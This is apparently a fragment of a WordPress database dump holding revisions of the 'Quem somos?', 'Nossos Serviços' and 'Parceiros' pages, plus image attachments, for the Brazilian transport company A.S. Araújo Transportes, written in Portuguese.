(141, 1, '2015-04-07 14:51:03', '2015-04-07 17:51:03', '', 'logo-lateral', '', 'inherit', 'open', 'open', '', 'logo-lateral', '', '', '2015-04-07 14:51:03', '2015-04-07 17:51:03', '', 0, 'http://araujotrans.com.br/wp-content/uploads/2015/04/logo-lateral.jpg', 0, 'attachment', 'image/jpeg', 0),
(142, 1, '2015-04-08 18:54:59', '2015-04-08 21:54:59', '', 'HRS', '', 'inherit', 'open', 'open', '', 'hrs-2', '', '', '2015-04-08 18:54:59', '2015-04-08 21:54:59', '', 0, 'http://araujotrans.com.br/wp-content/uploads/2015/04/HRS.jpg', 0, 'attachment', 'image/jpeg', 0),
(143, 1, '2015-04-08 19:02:22', '2015-04-08 22:02:22', 'A A.S. Araujo Transportes nasceu no coração do diretor André Silva Araujo que desde seus 18 anos de idade, iniciou sua carreira profissional nas ruas de São Paulo como moto-boy. Após várias passagens por empresas de transportes resolveu dar vida a seu sonho de abrir sua própria empresa que foi criada em 2011. \r\n\r\nApós vários cursos de apoio à Logística e Transportes, iniciou a implantação e análise do mercado no segmento de transportes terrestres. Sendo assim foi solidificado todos os padrões de qualidade para todo o processo de transportes em (entregas e retiradas), para que aconteça total satisfação do nosso cliente!\r\n\r\nCom todas estrutura implantada A.S. Araujo tem se dedicado 24hrs por dia em fazer o melhor para nossos parceiros e clientes!', 'Quem somos?', '', 'inherit', 'open', 'open', '', '26-revision-v1', '', '', '2015-04-08 19:02:22', '2015-04-08 22:02:22', '', 26, 'http://araujotrans.com.br/26-revision-v1/', 0, 'revision', '', 0),
(144, 1, '2015-04-08 19:08:03', '2015-04-08 22:08:03', 'A A.S. Araujo Transportes nasceu no coração do diretor André Silva Araujo que desde seus 18 anos de idade, iniciou sua carreira profissional nas ruas de São Paulo como moto-boy. Após várias passagens por empresas de transportes resolveu dar vida a seu sonho de abrir sua própria empresa que foi criada em 2011. \r\n\r\nApós vários cursos de apoio à Logística e Transportes, iniciou a implantação e análise do mercado no segmento de transportes terrestres. Sendo assim foi solidificado todos os padrões de qualidade para todo o processo de transportes em (entregas e retiradas), para que aconteça total satisfação do nosso cliente!\r\n\r\nCom toda estrutura implantada A.S. Araujo tem se dedicado 24hrs por dia em fazer o melhor para nossos parceiros e clientes!', 'Quem somos?', '', 'inherit', 'open', 'open', '', '26-revision-v1', '', '', '2015-04-08 19:08:03', '2015-04-08 22:08:03', '', 26, 'http://araujotrans.com.br/26-revision-v1/', 0, 'revision', '', 0),
(145, 1, '2015-04-08 19:08:27', '2015-04-08 22:08:27', 'A A.S. Araujo Transportes nasceu no coração do diretor André Silva Araujo que desde seus 18 anos de idade, iniciou sua carreira profissional nas ruas de São Paulo como moto-boy. Após várias passagens por empresas de transportes resolveu dar vida a seu sonho de abrir sua própria empresa que foi criada em 2011. \r\n\r\nApós vários cursos de apoio à Logística e Transportes, iniciou a implantação e análise do mercado no segmento de transportes terrestres. Sendo assim foi solidificado todos os padrões de qualidade para todo o processo de transportes em (entregas e retiradas), para que aconteça total satisfação do nosso cliente!\r\n\r\nEspaço com toda estrutura implantada A.S. Araujo tem se dedicado 24hrs por dia em fazer o melhor para nossos parceiros e clientes!', 'Quem somos?', '', 'inherit', 'open', 'open', '', '26-revision-v1', '', '', '2015-04-08 19:08:27', '2015-04-08 22:08:27', '', 26, 'http://araujotrans.com.br/26-revision-v1/', 0, 'revision', '', 0),
(146, 1, '2015-04-08 19:10:41', '2015-04-08 22:10:41', 'Nossos serviços estão centralizados no Atendimento Express em \"Entrega e Retirada\"\r\n \r\n<ul>\r\n	<li>Carga fracionada com agendamento prévio de 48h;</li>\r\n	<li>Agendamento Prévio para outros Estados;</li>\r\n	<li>Atendimento a Carga Viva - Animais de pequeno porte e médio porte como cães, gatos, etc. Com super estrutura e responsabilidade no transporte do animal;</li>\r\n	<li>Gestão de Transportes Terceirizados - Mudanças para todo o Território Nacional; </li>\r\n </ul>\r\n\r\nA.S. Araujo Transportes tem como objetivo priorizar nossos clientes os valorizando cada vez mais no atendimento e nas negociações. \r\n\r\n\r\nNosso Diferencial é priorizar nossos clientes, os valorizando cada vez mais no atendimento e nas negociações. ', 'Nossos Serviços', '', 'inherit', 'open', 'open', '', '96-revision-v1', '', '', '2015-04-08 19:10:41', '2015-04-08 22:10:41', '', 96, 'http://araujotrans.com.br/96-revision-v1/', 0, 'revision', '', 0),
(147, 1, '2015-04-08 19:11:05', '2015-04-08 22:11:05', 'Nossos serviços estão centralizados no Atendimento Express, mas também temos:\r\n \r\n<ul>\r\n	<li>Carga fracionada com agendamento prévio de 48h;</li>\r\n	<li>Agendamento Prévio para outros Estados;</li>\r\n	<li>Atendimento a Carga Viva - Animais de pequeno porte e médio porte como cães, gatos, etc. Com super estrutura e responsabilidade no transporte do animal;</li>\r\n	<li>Gestão de Transportes Terceirizados - Mudanças para todo o Território Nacional; </li>\r\n </ul>\r\n\r\nA.S. Araujo Transportes tem como objetivo priorizar nossos clientes os valorizando cada vez mais no atendimento e nas negociações. \r\n\r\n\r\nNosso Diferencial é priorizar nossos clientes, os valorizando cada vez mais no atendimento e nas negociações. ', 'Nossos Serviços', '', 'inherit', 'open', 'open', '', '96-revision-v1', '', '', '2015-04-08 19:11:05', '2015-04-08 22:11:05', '', 96, 'http://araujotrans.com.br/96-revision-v1/', 0, 'revision', '', 0),
(148, 1, '2015-04-08 19:13:30', '2015-04-08 22:13:30', 'Nossos serviços estão centralizados no Atendimento Express, mas também temos:\r\n \r\n<ul>\r\n	<li>Agendamento Prévio para outros Estados;</li>\r\n	<li>Carga fracionada com agendamento prévio de 48h;</li>\r\n	<li>Atendimento a Carga Viva - Animais de pequeno porte e médio porte como cães, gatos, etc. Com super estrutura e responsabilidade no transporte do animal;</li>\r\n	<li>Gestão de Transportes Terceirizados - Mudanças para todo o Território Nacional; </li>\r\n </ul>\r\n\r\nA.S. Araujo Transportes tem como objetivo priorizar nossos clientes os valorizando cada vez mais no atendimento e nas negociações. \r\n\r\n\r\nNosso Diferencial é priorizar nossos clientes, os valorizando cada vez mais no atendimento e nas negociações. ', 'Nossos Serviços', '', 'inherit', 'open', 'open', '', '96-revision-v1', '', '', '2015-04-08 19:13:30', '2015-04-08 22:13:30', '', 96, 'http://araujotrans.com.br/96-revision-v1/', 0, 'revision', '', 0),
(149, 1, '2015-04-08 19:14:20', '2015-04-08 22:14:20', 'Nossos serviços estão centralizados no Atendimento Express, mas também temos:\r\n \r\n<ul>\r\n	<li>Agendamento Prévio para outros Estados;</li>\r\n	<li>Carga fracionada com agendamento prévio de 48h;</li>\r\n	<li>Atendimento a Carga Viva - Animais de pequeno porte e médio porte como cães, gatos, etc. Com super estrutura e responsabilidade no transporte do animal;</li>\r\n	<li>Gestão de Transportes Terceirizados - Mudanças para todo o Território Nacional; </li>\r\n </ul>\r\n\r\nA.S. Araujo Transportes tem como objetivo priorizar nossos clientes os valorizando cada vez mais no atendimento e nas negociações. \r\n\r\n\r\nNosso diferencial é priorizar nossos clientes, os valorizando cada vez mais no atendimento e nas negociações. ', 'Nossos Serviços', '', 'inherit', 'open', 'open', '', '96-revision-v1', '', '', '2015-04-08 19:14:20', '2015-04-08 22:14:20', '', 96, 'http://araujotrans.com.br/96-revision-v1/', 0, 'revision', '', 0),
(150, 1, '2015-04-08 19:15:24', '2015-04-08 22:15:24', 'Nossos serviços estão centralizados no Atendimento Express, mas também temos:\r\n \r\n<ul>\r\n	<li>Agendamento Prévio para outros Estados;</li>\r\n	<li>Carga fracionada com agendamento prévio de 48h;</li>\r\n	<li>Atendimento a Carga Viva - Animais de pequeno porte e médio porte como cães, gatos, etc. Com super estrutura e responsabilidade no transporte do animal;</li>\r\n	<li>Gestão de Transportes Terceirizados - Mudanças para todo o Território Nacional; </li>\r\n </ul>\r\n\r\nA.S. Araujo Transportes tem como objetivo priorizar nossos clientes os valorizando cada vez mais no atendimento e nas negociações. \r\n\r\n\r\nNosso diferencial é priorizar nossos clientes, os valorizando cada vez mais no atendimento e nas negociações. Araujo Transportes, sempre com você!', 'Nossos Serviços', '', 'inherit', 'open', 'open', '', '96-revision-v1', '', '', '2015-04-08 19:15:24', '2015-04-08 22:15:24', '', 96, 'http://araujotrans.com.br/96-revision-v1/', 0, 'revision', '', 0),
(151, 1, '2015-04-08 19:15:42', '2015-04-08 22:15:42', 'Nossos serviços estão centralizados no Atendimento Express, mas também temos:\r\n \r\n<ul>\r\n	<li>Agendamento Prévio para outros Estados;</li>\r\n	<li>Carga fracionada com agendamento prévio de 48h;</li>\r\n	<li>Atendimento a Carga Viva - Animais de pequeno porte e médio porte como cães, gatos, etc. Com super estrutura e responsabilidade no transporte do animal;</li>\r\n	<li>Gestão de Transportes Terceirizados - Mudanças para todo o Território Nacional; </li>\r\n </ul>\r\n\r\nA.S. Araujo Transportes tem como objetivo priorizar nossos clientes os valorizando cada vez mais no atendimento e nas negociações. \r\n\r\n\r\nNosso diferencial é priorizar nossos clientes, os valorizando cada vez mais no atendimento e nas negociações.\r\n\r\nAraujo Transportes, sempre com você!', 'Nossos Serviços', '', 'inherit', 'open', 'open', '', '96-revision-v1', '', '', '2015-04-08 19:15:42', '2015-04-08 22:15:42', '', 96, 'http://araujotrans.com.br/96-revision-v1/', 0, 'revision', '', 0),
(152, 1, '2015-04-08 19:15:58', '2015-04-08 22:15:58', 'Nossos serviços estão centralizados no Atendimento Express, mas também temos:\r\n \r\n<ul>\r\n	<li>Agendamento Prévio para outros Estados;</li>\r\n	<li>Carga fracionada com agendamento prévio de 48h;</li>\r\n	<li>Atendimento a Carga Viva - Animais de pequeno porte e médio porte como cães, gatos, etc. Com super estrutura e responsabilidade no transporte do animal;</li>\r\n	<li>Gestão de Transportes Terceirizados - Mudanças para todo o Território Nacional; </li>\r\n </ul>\r\n\r\nA.S. Araujo Transportes tem como objetivo priorizar nossos clientes os valorizando cada vez mais no atendimento e nas negociações. \r\n\r\n\r\nNosso diferencial é priorizar nossos clientes, os valorizando cada vez mais no atendimento e nas negociações.\r\n\r\n<strong>Araujo Transportes, sempre com você!</strong>', 'Nossos Serviços', '', 'inherit', 'open', 'open', '', '96-revision-v1', '', '', '2015-04-08 19:15:58', '2015-04-08 22:15:58', '', 96, 'http://araujotrans.com.br/96-revision-v1/', 0, 'revision', '', 0),
(153, 1, '2015-04-09 23:05:16', '2015-04-10 02:05:16', 'A A.S. Araújo Transportes nasceu no coração do diretor André Silva Araújo que desde seus 18 anos de idade, iniciou sua carreira profissional nas ruas de São Paulo como moto-boy. Após várias passagens por empresas de transportes resolveu dar vida a seu sonho de abrir sua própria empresa que foi criada em 2011. \n\nEspaço com toda estrutura implantada A.S. Araújo tem se dedicado 24hrs por dia em fazer o melhor para nossos parceiros e clientes!\n\n&nbsp;\n<h1 class=\"header-post-title-class\">Missão, Valores e Visão</h1>\n&nbsp;\n<strong>Missão</strong> - Garantir a confiança dos nossos clientes atuando com responsabilidade e seriedade para que possamos obter qualidade na prestação dos nossos serviços.\n\n<strong>Valores</strong> - Agir com honestidade em todos os setores. Respeitando todos os conceitos éticos e morais. Fazer cumprir todas as obrigações fiscais e trabalhistas para uma ampla satisfação.\n\n<strong>Visão</strong> - Ser uma empresa que atue em todo o território nacional. Sendo excelente em todos os ramos de atividades à que estamos disponíveis no mercado nacional e internacional.\n\n\n<strong>Araújo Transportes, sempre com você!</strong>', 'Quem somos?', '', 'inherit', 'open', 'open', '', '26-autosave-v1', '', '', '2015-04-09 23:05:16', '2015-04-10 02:05:16', '', 26, 'http://araujotrans.com.br/26-autosave-v1/', 0, 'revision', '', 0),
(154, 1, '2015-04-08 19:18:38', '2015-04-08 22:18:38', 'A A.S. Araujo Transportes nasceu no coração do diretor André Silva Araujo que desde seus 18 anos de idade, iniciou sua carreira profissional nas ruas de São Paulo como moto-boy. Após várias passagens por empresas de transportes resolveu dar vida a seu sonho de abrir sua própria empresa que foi criada em 2011. \r\n\r\nEspaço com toda estrutura implantada A.S. Araujo tem se dedicado 24hrs por dia em fazer o melhor para nossos parceiros e clientes!\r\n\r\n<h1 class=\"header-post-title-class\">Missão, Valores e Visão</h1>\r\n\r\nApós vários cursos de apoio à Logística e Transportes, iniciou a implantação e análise do mercado no segmento de transportes terrestres. Sendo assim foi solidificado todos os padrões de qualidade para todo o processo de transportes em (entregas e retiradas), para que aconteça total satisfação do nosso cliente!\r\n\r\n', 'Quem somos?', '', 'inherit', 'open', 'open', '', '26-revision-v1', '', '', '2015-04-08 19:18:38', '2015-04-08 22:18:38', '', 26, 'http://araujotrans.com.br/26-revision-v1/', 0, 'revision', '', 0),
(155, 1, '2015-04-08 19:19:09', '2015-04-08 22:19:09', 'A A.S. Araujo Transportes nasceu no coração do diretor André Silva Araujo que desde seus 18 anos de idade, iniciou sua carreira profissional nas ruas de São Paulo como moto-boy. Após várias passagens por empresas de transportes resolveu dar vida a seu sonho de abrir sua própria empresa que foi criada em 2011. \r\n\r\nEspaço com toda estrutura implantada A.S. Araujo tem se dedicado 24hrs por dia em fazer o melhor para nossos parceiros e clientes!\r\n\r\n&nbsp;\r\n<h1 class=\"header-post-title-class\">Missão, Valores e Visão</h1>\r\n&nbsp;\r\n\r\nApós vários cursos de apoio à Logística e Transportes, iniciou a implantação e análise do mercado no segmento de transportes terrestres. Sendo assim foi solidificado todos os padrões de qualidade para todo o processo de transportes em (entregas e retiradas), para que aconteça total satisfação do nosso cliente!\r\n\r\n', 'Quem somos?', '', 'inherit', 'open', 'open', '', '26-revision-v1', '', '', '2015-04-08 19:19:09', '2015-04-08 22:19:09', '', 26, 'http://araujotrans.com.br/26-revision-v1/', 0, 'revision', '', 0),
(156, 1, '2015-04-08 19:19:53', '2015-04-08 22:19:53', 'A A.S. Araujo Transportes nasceu no coração do diretor André Silva Araujo que desde seus 18 anos de idade, iniciou sua carreira profissional nas ruas de São Paulo como moto-boy. Após várias passagens por empresas de transportes resolveu dar vida a seu sonho de abrir sua própria empresa que foi criada em 2011. \r\n\r\nEspaço com toda estrutura implantada A.S. Araujo tem se dedicado 24hrs por dia em fazer o melhor para nossos parceiros e clientes!\r\n\r\n&nbsp;\r\n<h1 class=\"header-post-title-class\">Missão, Valores e Visão</h1>\r\n&nbsp;\r\n\r\nApós vários cursos de apoio à Logística e Transportes, iniciou a implantação e análise do mercado no segmento de transportes terrestres. Sendo assim foi solidificado todos os padrões de qualidade para todo o processo de transportes em (entregas e retiradas), para que aconteça total satisfação do nosso cliente!\r\n\r\n<strong>Araujo Transportes, sempre com você!</strong>\r\n', 'Quem somos?', '', 'inherit', 'open', 'open', '', '26-revision-v1', '', '', '2015-04-08 19:19:53', '2015-04-08 22:19:53', '', 26, 'http://araujotrans.com.br/26-revision-v1/', 0, 'revision', '', 0),
(157, 1, '2015-04-08 19:26:37', '2015-04-08 22:26:37', '', 'Twitter_Shipping', '', 'inherit', 'open', 'open', '', 'twitter_shipping', '', '', '2015-04-08 19:26:37', '2015-04-08 22:26:37', '', 0, 'http://araujotrans.com.br/wp-content/uploads/2015/04/Twitter_Shipping.png', 0, 'attachment', 'image/png', 0),
(158, 1, '2015-04-08 19:36:17', '2015-04-08 22:36:17', '', 'google+_Shipping', '', 'inherit', 'open', 'open', '', 'google_shipping', '', '', '2015-04-08 19:36:17', '2015-04-08 22:36:17', '', 0, 'http://araujotrans.com.br/wp-content/uploads/2015/04/google-_Shipping.png', 0, 'attachment', 'image/png', 0),
(160, 1, '2015-04-09 00:03:18', '2015-04-09 03:03:18', ' ', '', '', 'publish', 'open', 'open', '', '160', '', '', '2015-04-09 00:03:18', '2015-04-09 03:03:18', '', 0, 'http://araujotrans.com.br/?p=160', 4, 'nav_menu_item', '', 0),
(161, 1, '2015-04-09 22:58:47', '2015-04-10 01:58:47', 'A A.S. Araujo Transportes nasceu no coração do diretor André Silva Araujo que desde seus 18 anos de idade, iniciou sua carreira profissional nas ruas de São Paulo como moto-boy. Após várias passagens por empresas de transportes resolveu dar vida a seu sonho de abrir sua própria empresa que foi criada em 2011. \r\n\r\nEspaço com toda estrutura implantada A.S. Araujo tem se dedicado 24hrs por dia em fazer o melhor para nossos parceiros e clientes!\r\n\r\nApós vários cursos de apoio à Logística e Transportes, iniciou a implantação e análise do mercado no segmento de transportes terrestres. Sendo assim foi solidificado todos os padrões de qualidade para todo o processo de transportes em (entregas e retiradas), para que aconteça total satisfação do nosso cliente!\r\n&nbsp;\r\n<h1 class=\"header-post-title-class\">Missão, Valores e Visão</h1>\r\n&nbsp;\r\n<strong>Missão</strong> - Garantir a confiança dos nossos clientes atuando com responsabilidade e seriedadepara que possamos obter qualidade na prestação dos nossos serviços.\r\n<strong>Valores</strong> - Agir com honestidade em todos os setores. Respeitando todos os conceitos éticos e morais. Fazer cumprir todas as obrigações fiscais e trabalhistas para uma ampla satisfação.\r\n<strong>Visão</strong> - Ser uma empresa que atue em todo o território nacional. Sendo excelente em todos os ramos de atividades à que estamos disponíveis no mercado nacional e internacional.\r\n\r\n\r\n<strong>Araujo Transportes, sempre com você!</strong>\r\n', 'Quem somos?', '', 'inherit', 'open', 'open', '', '26-revision-v1', '', '', '2015-04-09 22:58:47', '2015-04-10 01:58:47', '', 26, 'http://www.araujotrans.com.br/26-revision-v1/', 0, 'revision', '', 0),
(162, 1, '2015-04-09 22:59:16', '2015-04-10 01:59:16', 'A A.S. Araujo Transportes nasceu no coração do diretor André Silva Araujo que desde seus 18 anos de idade, iniciou sua carreira profissional nas ruas de São Paulo como moto-boy. Após várias passagens por empresas de transportes resolveu dar vida a seu sonho de abrir sua própria empresa que foi criada em 2011. \r\n\r\nEspaço com toda estrutura implantada A.S. Araujo tem se dedicado 24hrs por dia em fazer o melhor para nossos parceiros e clientes!\r\n\r\nApós vários cursos de apoio à Logística e Transportes, iniciou a implantação e análise do mercado no segmento de transportes terrestres. Sendo assim foi solidificado todos os padrões de qualidade para todo o processo de transportes em (entregas e retiradas), para que aconteça total satisfação do nosso cliente!\r\n&nbsp;\r\n<h1 class=\"header-post-title-class\">Missão, Valores e Visão</h1>\r\n&nbsp;\r\n<strong>Missão</strong> - Garantir a confiança dos nossos clientes atuando com responsabilidade e seriedade para que possamos obter qualidade na prestação dos nossos serviços.\r\n\r\n<strong>Valores</strong> - Agir com honestidade em todos os setores. Respeitando todos os conceitos éticos e morais. Fazer cumprir todas as obrigações fiscais e trabalhistas para uma ampla satisfação.\r\n\r\n<strong>Visão</strong> - Ser uma empresa que atue em todo o território nacional. Sendo excelente em todos os ramos de atividades à que estamos disponíveis no mercado nacional e internacional.\r\n\r\n\r\n<strong>Araujo Transportes, sempre com você!</strong>', 'Quem somos?', '', 'inherit', 'open', 'open', '', '26-revision-v1', '', '', '2015-04-09 22:59:16', '2015-04-10 01:59:16', '', 26, 'http://www.araujotrans.com.br/26-revision-v1/', 0, 'revision', '', 0),
(163, 1, '2015-04-09 23:02:01', '2015-04-10 02:02:01', 'A A.S. Araujo Transportes nasceu no coração do diretor André Silva Araujo que desde seus 18 anos de idade, iniciou sua carreira profissional nas ruas de São Paulo como moto-boy. Após várias passagens por empresas de transportes resolveu dar vida a seu sonho de abrir sua própria empresa que foi criada em 2011. \r\n\r\nEspaço com toda estrutura implantada A.S. Araujo tem se dedicado 24hrs por dia em fazer o melhor para nossos parceiros e clientes!\r\n\r\n&nbsp;\r\n<h1 class=\"header-post-title-class\">Missão, Valores e Visão</h1>\r\n&nbsp;\r\n<strong>Missão</strong> - Garantir a confiança dos nossos clientes atuando com responsabilidade e seriedade para que possamos obter qualidade na prestação dos nossos serviços.\r\n\r\n<strong>Valores</strong> - Agir com honestidade em todos os setores. Respeitando todos os conceitos éticos e morais. Fazer cumprir todas as obrigações fiscais e trabalhistas para uma ampla satisfação.\r\n\r\n<strong>Visão</strong> - Ser uma empresa que atue em todo o território nacional. Sendo excelente em todos os ramos de atividades à que estamos disponíveis no mercado nacional e internacional.\r\n\r\n\r\n<strong>Araujo Transportes, sempre com você!</strong>', 'Quem somos?', '', 'inherit', 'open', 'open', '', '26-revision-v1', '', '', '2015-04-09 23:02:01', '2015-04-10 02:02:01', '', 26, 'http://www.araujotrans.com.br/26-revision-v1/', 0, 'revision', '', 0),
(164, 1, '2015-04-09 23:02:23', '2015-04-10 02:02:23', 'Nossos serviços estão centralizados no Atendimento Express, mas também temos:\r\n \r\n<ul>\r\n	<li>Agendamento Prévio para outros Estados;</li>\r\n	<li>Carga fracionada com agendamento prévio de 48h;</li>\r\n	<li>Atendimento a Carga Viva - Animais de pequeno porte e médio porte como cães, gatos, etc. Com super estrutura e responsabilidade no transporte do animal;</li>\r\n	<li>Gestão de Transportes Terceirizados - Mudanças para todo o Território Nacional; </li>\r\n </ul>\r\n\r\nApós vários cursos de apoio à Logística e Transportes, iniciou a implantação e análise do mercado no segmento de transportes terrestres. Sendo assim foi solidificado todos os padrões de qualidade para todo o processo de transportes em (entregas e retiradas), para que aconteça total satisfação do nosso cliente!\r\n\r\nA.S. Araujo Transportes tem como objetivo priorizar nossos clientes os valorizando cada vez mais no atendimento e nas negociações. \r\n\r\n\r\nNosso diferencial é priorizar nossos clientes, os valorizando cada vez mais no atendimento e nas negociações.\r\n\r\n<strong>Araujo Transportes, sempre com você!</strong>', 'Nossos Serviços', '', 'inherit', 'open', 'open', '', '96-revision-v1', '', '', '2015-04-09 23:02:23', '2015-04-10 02:02:23', '', 96, 'http://www.araujotrans.com.br/96-revision-v1/', 0, 'revision', '', 0),
(165, 1, '2015-04-09 23:04:29', '2015-04-10 02:04:29', 'Nossos serviços estão centralizados no Atendimento Express, mas também temos:\r\n \r\n<ul>\r\n	<li>Agendamento Prévio para outros Estados;</li>\r\n	<li>Carga fracionada com agendamento prévio de 48h;</li>\r\n	<li>Atendimento a Carga Viva - Animais de pequeno porte e médio porte como cães, gatos, etc. Com super estrutura e responsabilidade no transporte do animal;</li>\r\n	<li>Gestão de Transportes Terceirizados - Mudanças para todo o Território Nacional; </li>\r\n </ul>\r\n\r\nApós vários cursos de apoio à Logística e Transportes, iniciou a implantação e análise do mercado no segmento de transportes terrestres. Sendo assim foi solidificado todos os padrões de qualidade para todo o processo de transportes em (entregas e retiradas), para que aconteça total satisfação do nosso cliente!\r\n\r\nA.S. Araújo Transportes tem como objetivo priorizar nossos clientes os valorizando cada vez mais no atendimento e nas negociações. \r\n\r\n\r\nNosso diferencial é priorizar nossos clientes, os valorizando cada vez mais no atendimento e nas negociações.\r\n\r\n<strong>Araújo Transportes, sempre com você!</strong>', 'Nossos Serviços', '', 'inherit', 'open', 'open', '', '96-revision-v1', '', '', '2015-04-09 23:04:29', '2015-04-10 02:04:29', '', 96, 'http://www.araujotrans.com.br/96-revision-v1/', 0, 'revision', '', 0),
(166, 1, '2015-04-09 23:04:45', '2015-04-10 02:04:45', 'Através de anos fomos fazendo parcerias muito importantes para o crescimento da Araújo Transportes. Não podemos esquecer dessas parcerias tão importantes neste momento. Conheça alguns de nossos parceiros e faça parte desse sucesso!\r\n\r\n<div class=\"parceiros\"><a href=\"http://www.decisivacontabil.com.br/\" target=\"_blank\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/Decesiva-150x150.jpg\" /></a></div>\r\n\r\n<div class=\"parceiros\"><a href=\"http://www.mandae.com.br/\" target=\"_blank\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/mandae-150x150.jpg\" /></a></div>\r\n\r\n<div class=\"parceiros\"><a href=\"http://www.phoenixmecano.com.br/produtos.php?gclid=Cj0KEQjw0fOoBRDn88Pol8bqhN0BEiQARGVJKmpkHgpcni99UxyEPRz4QgeNujAVllLDu94JfU3yVx4aAmlL8P8HAQ\" target=\"_blank\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/phoenix-150x150.jpg\" /></a></div>\r\n\r\n<div class=\"parceiros\"><a href=\"#\" target=\"_blank\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/via-150x150.jpg\" /></a></div>\r\n\r\n', 'Parceiros', '', 'inherit', 'open', 'open', '', '91-revision-v1', '', '', '2015-04-09 23:04:45', '2015-04-10 02:04:45', '', 91, 'http://www.araujotrans.com.br/91-revision-v1/', 0, 'revision', '', 0),
(167, 1, '2015-04-09 23:05:19', '2015-04-10 02:05:19', 'A A.S. Araújo Transportes nasceu no coração do diretor André Silva Araújo que desde seus 18 anos de idade, iniciou sua carreira profissional nas ruas de São Paulo como moto-boy. Após várias passagens por empresas de transportes resolveu dar vida a seu sonho de abrir sua própria empresa que foi criada em 2011. \r\n\r\nEspaço com toda estrutura implantada A.S. Araújo tem se dedicado 24hrs por dia em fazer o melhor para nossos parceiros e clientes!\r\n\r\n&nbsp;\r\n<h1 class=\"header-post-title-class\">Missão, Valores e Visão</h1>\r\n&nbsp;\r\n<strong>Missão</strong> - Garantir a confiança dos nossos clientes atuando com responsabilidade e seriedade para que possamos obter qualidade na prestação dos nossos serviços.\r\n\r\n<strong>Valores</strong> - Agir com honestidade em todos os setores. Respeitando todos os conceitos éticos e morais. Fazer cumprir todas as obrigações fiscais e trabalhistas para uma ampla satisfação.\r\n\r\n<strong>Visão</strong> - Ser uma empresa que atue em todo o território nacional. Sendo excelente em todos os ramos de atividades à que estamos disponíveis no mercado nacional e internacional.\r\n\r\n\r\n<strong>Araújo Transportes, sempre com você!</strong>', 'Quem somos?', '', 'inherit', 'open', 'open', '', '26-revision-v1', '', '', '2015-04-09 23:05:19', '2015-04-10 02:05:19', '', 26, 'http://www.araujotrans.com.br/26-revision-v1/', 0, 'revision', '', 0),
(168, 1, '2015-04-09 23:08:35', '2015-04-10 02:08:35', 'Através dos anos fomos fazendo parcerias muito importantes para o crescimento da Araújo Transportes. Não podemos esquecer dessas parcerias tão importantes neste momento. Conheça alguns de nossos parceiros e faça parte desse sucesso!\r\n\r\n<div class=\"parceiros\"><a href=\"http://www.decisivacontabil.com.br/\" target=\"_blank\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/Decesiva-150x150.jpg\" /></a></div>\r\n\r\n<div class=\"parceiros\"><a href=\"http://www.mandae.com.br/\" target=\"_blank\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/mandae-150x150.jpg\" /></a></div>\r\n\r\n<div class=\"parceiros\"><a href=\"http://www.phoenixmecano.com.br/produtos.php?gclid=Cj0KEQjw0fOoBRDn88Pol8bqhN0BEiQARGVJKmpkHgpcni99UxyEPRz4QgeNujAVllLDu94JfU3yVx4aAmlL8P8HAQ\" target=\"_blank\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/phoenix-150x150.jpg\" /></a></div>\r\n\r\n<div class=\"parceiros\"><a href=\"#\" target=\"_blank\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/via-150x150.jpg\" /></a></div>\r\n\r\n', 'Parceiros', '', 'inherit', 'open', 'open', '', '91-revision-v1', '', '', '2015-04-09 23:08:35', '2015-04-10 02:08:35', '', 91, 'http://www.araujotrans.com.br/91-revision-v1/', 0, 'revision', '', 0),
(169, 1, '2015-04-09 23:17:33', '2015-04-10 02:17:33', 'A A.S. Araújo Transportes nasceu no coração do diretor André Silva Araújo que desde seus 18 anos de idade, iniciou sua carreira profissional nas ruas de São Paulo como moto-boy. Após várias passagens por empresas de transportes resolveu dar vida a seu sonho de abrir sua própria empresa que foi criada em 2011.\r\n\r\nEspaço com toda estrutura implantada A.S. Araújo tem se dedicado 24hrs por dia em fazer o melhor para nossos parceiros e clientes!\r\n\r\n&nbsp;\r\n<h1 class=\"header-post-title-class\">Missão, Valores e Visão</h1>\r\n<strong>Missão</strong> - Garantir a confiança dos nossos clientes atuando com responsabilidade e seriedade para que possamos obter qualidade na prestação dos nossos serviços.\r\n\r\n<strong>Valores</strong> - Agir com honestidade em todos os setores. Respeitando todos os conceitos éticos e morais. Fazer cumprir todas as obrigações fiscais e trabalhistas para uma ampla satisfação.\r\n\r\n<strong>Visão</strong> - Ser uma empresa que atue em todo o território nacional. Sendo excelente em todos os ramos de atividades à que estamos disponíveis no mercado nacional e internacional.\r\n\r\n<strong>Araújo Transportes, sempre com você!</strong>', 'Quem somos?', '', 'inherit', 'open', 'open', '', '26-revision-v1', '', '', '2015-04-09 23:17:33', '2015-04-10 02:17:33', '', 26, 'http://www.araujotrans.com.br/26-revision-v1/', 0, 'revision', '', 0),
(170, 1, '2015-04-09 23:20:41', '2015-04-10 02:20:41', 'Nossos serviços estão centralizados no Atendimento Express, mas também temos:\r\n<ul>\r\n	<li>Agendamento Prévio para outros Estados;</li>\r\n	<li>Carga fracionada com agendamento prévio de 48h;</li>\r\n	<li>Atendimento a Carga Viva - Animais de pequeno porte e médio porte como cães, gatos, etc. Com super estrutura e responsabilidade no transporte do animal;</li>\r\n	<li>Gestão de Transportes Terceirizados - Mudanças para todo o Território Nacional;</li>\r\n</ul>\r\nApós vários cursos de apoio à Logística e Transportes, iniciou a implantação e análise do mercado no segmento de transportes terrestres. Sendo assim foi solidificado todos os padrões de qualidade para todo o processo de transportes em (entregas e retiradas), para que aconteça total satisfação do nosso cliente!\r\n\r\nA.S. Araújo Transportes tem como objetivo priorizar nossos clientes os valorizando cada vez mais no atendimento e nas negociações.\r\n\r\nNosso diferencial é priorizar nossos clientes, os valorizando cada vez mais no atendimento e nas negociações.\r\n\r\n<strong>Araújo Transportes, sempre com você!</strong>', 'Nossos Serviços', '', 'inherit', 'open', 'open', '', '96-revision-v1', '', '', '2015-04-09 23:20:41', '2015-04-10 02:20:41', '', 96, 'http://www.araujotrans.com.br/96-revision-v1/', 0, 'revision', '', 0);
